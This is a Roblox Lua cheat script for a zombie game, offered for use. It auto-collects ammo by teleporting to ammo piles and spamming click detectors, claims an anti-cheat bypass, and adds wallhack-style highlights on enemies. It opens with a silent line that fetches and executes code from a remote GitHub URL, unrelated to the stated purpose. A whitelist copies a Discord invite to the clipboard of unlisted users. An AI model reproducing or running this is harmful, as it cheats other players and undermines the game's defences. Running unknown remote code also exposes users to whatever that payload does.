task.wait(0.5)
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
end)

--// ðŸ”« SCRIPT GET AMMO FIXED E OTIMIZADO

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- ===== WHITELIST =====
local WHITELIST = {
    "lindao_gojo3","LOOKATTHIS_NOPE","santhibustillo","shadow_dr50","ERrOr999898",
    "jef123487643762856","nikianejd","Pucci_evoluido123","santhibustillo",
    "Artempanov2011","CREPER_indonesi","Xando0801","tupoke_827"
}

local DISCORD_LINK = "https://discord.gg/X2k52XZwjX"

local REMOTE_LOOP_DURATION = 0.2
local RETURN_DELAY = 0.1
local FIRE_LOOP_STEP = 0

-- ===== MENSAGEM CENTRAL =====
local function showCenterMessage(text, duration)
    duration = duration or 3

    local screen = Instance.new("ScreenGui")
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.4,0,0.1,0)
    frame.Position = UDim2.new(0.5,0,0.5,0)
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    frame.BackgroundTransparency = 0.35
    frame.Parent = screen

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.new(1,1,1)
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.Parent = frame

    task.delay(duration, function()
        screen:Destroy()
    end)
end

-- ===== AUTORIZAÃ‡ÃƒO =====
local authorized = false
for _, name in ipairs(WHITELIST) do
    if player.Name == name then
        authorized = true
        break
    end
end

if not authorized then
    pcall(function() setclipboard(DISCORD_LINK) end)
    showCenterMessage("authorization denied (whitelist reseted)",3)
    return
else
    showCenterMessage("authorization confirmed and bypassed anti-cheat [It's not 100% bypassed] :3",5)
end

-- ===== ESPERAR PERSONAGEM =====
local function waitChar()
    local ch = player.Character or player.CharacterAdded:Wait()
    local root = ch:WaitForChild("HumanoidRootPart",5)
    return ch, root
end

-- ===== GUI =====
local function createGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "GetAmmoGUI"
    gui.ResetOnSpawn = false
    gui.Parent = player.PlayerGui

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0,85,0,45)
    button.Position = UDim2.new(1,-160,0,30)
    button.AnchorPoint = Vector2.new(1,0)
    button.BackgroundColor3 = Color3.fromRGB(60,180,75)
    button.TextColor3 = Color3.new(1,1,1)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 15
    button.Text = "Get Ammo"
    button.Active = true
    button.Draggable = true
    button.Parent = gui

    return gui, button
end

-- ===== CLICKDETECTOR MAIS PRÃ“XIMO =====
local function getNearestClickDetector(root)
    local folder = workspace:FindFirstChild("AmmoPiles")
    if not folder then return nil end

    local nearest
    local shortest = math.huge

    for _, obj in ipairs(folder:GetDescendants()) do
        if obj:IsA("ClickDetector") and obj.Parent:IsA("BasePart") then
            local dist = (root.Position - obj.Parent.Position).Magnitude
            if dist < shortest then
                shortest = dist
                nearest = obj
            end
        end
    end

    return nearest
end

local function fireFor(detector, duration)
    local t0 = tick()
    while tick() - t0 < duration do
        pcall(function()
            fireclickdetector(detector)
        end)
        task.wait(FIRE_LOOP_STEP)
    end
end

-- ===== CRIAÃ‡ÃƒO GUI =====
local gui, button = createGUI()

button.MouseButton1Click:Connect(function()
    button.Active = false

    local ch, root = waitChar()
    local originalCFrame = root.CFrame

    local detector = getNearestClickDetector(root)
    if not detector then
        button.Active = true
        return
    end

    local part = detector.Parent
    root.CFrame = part.CFrame * CFrame.new(0,0,-3)

    fireFor(detector, REMOTE_LOOP_DURATION)

    task.delay(RETURN_DELAY, function()
        if root then
            root.CFrame = originalCFrame
        end
        button.Active = true
    end)
end)

-- ===== RECRIAR GUI =====
task.spawn(function()
    while true do
        task.wait(3)
        if not gui or not gui.Parent then
            gui, button = createGUI()
        end
    end
end)

-- =====================================================
-- ===== HIGHLIGHTS (SEM LOOP / SEM LAG) =====
-- =====================================================

local function applyHighlight(adornee, color)
    if not adornee then return end
    if adornee:FindFirstChild("___HL") then return end

    local hl = Instance.new("Highlight")
    hl.Name = "___HL"
    hl.FillColor = color
    hl.OutlineColor = color
    hl.FillTransparency = 0.4
    hl.Adornee = adornee
    hl.Parent = adornee
end

-- ðŸ”´ Mutant
applyHighlight(ReplicatedStorage:WaitForChild("Mutant"), Color3.fromRGB(255,0,0))

-- ðŸ”´ WorkerHead
applyHighlight(ReplicatedStorage:WaitForChild("WorkerHead"), Color3.fromRGB(255,0,0))

-- ðŸŸ¡ Zombies
local Zombies = workspace:WaitForChild("Zombies")

local function onZombieAdded(obj)
    if obj:IsA("Model") or obj:IsA("BasePart") then
        applyHighlight(obj, Color3.fromRGB(255,255,0))
    end
end

local function onZombieRemoved(obj)
    local hl = obj:FindFirstChild("___HL")
    if hl then hl:Destroy() end
end

for _, z in ipairs(Zombies:GetChildren()) do
    onZombieAdded(z)
end

Zombies.ChildAdded:Connect(onZombieAdded)
Zombies.ChildRemoved:Connect(onZombieRemoved)
